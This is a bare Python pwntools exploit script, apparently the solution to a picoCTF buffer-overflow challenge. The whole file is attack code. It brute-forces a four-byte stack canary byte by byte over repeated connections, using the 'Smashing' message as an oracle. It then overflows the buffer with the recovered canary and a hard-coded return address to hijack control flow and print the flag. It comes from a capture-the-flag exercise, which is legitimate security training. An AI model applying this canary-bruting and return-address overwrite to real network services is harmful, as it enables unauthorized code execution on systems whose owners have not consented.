from pwn import *

host = 'saturn.picoctf.net'
port = 62183
canary = ''
payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
payload_end = 'BBBBBBBBBBBBBBBB'


def exploit(canary):
	try:
		connect = remote(host,port)
		connect.sendlineafter(b'> ', str(200).encode())
		connect.sendlineafter(b'Input> ', (payload + canary + payload_end).encode() + p32(0x08049336))
		output = connect.recvall()
		print(f'FLAG => ' + str(output[28:71]))
		exit()
	except Exception as e:
		print(e)
		exit()

print('[+] Connecting...')
print('[+] Bruting Canary...')
with context.quiet:
	for n in range(1,5):
		for i in range(256):
			connect = remote(host,port)

			connect.sendlineafter(b'> ', str(64 + n).encode())
			connect.sendlineafter(b'Input> ', (payload + canary + chr(i)).encode())

			output = connect.recvall()

			if b'Smashing' not in output:
				canary += chr(i)
				print(f'[+] Character Found => ' + canary)
				if len(canary) == 4:
					print('[+] Canary Found => ' + canary)
					exploit(canary)
				else:
					break
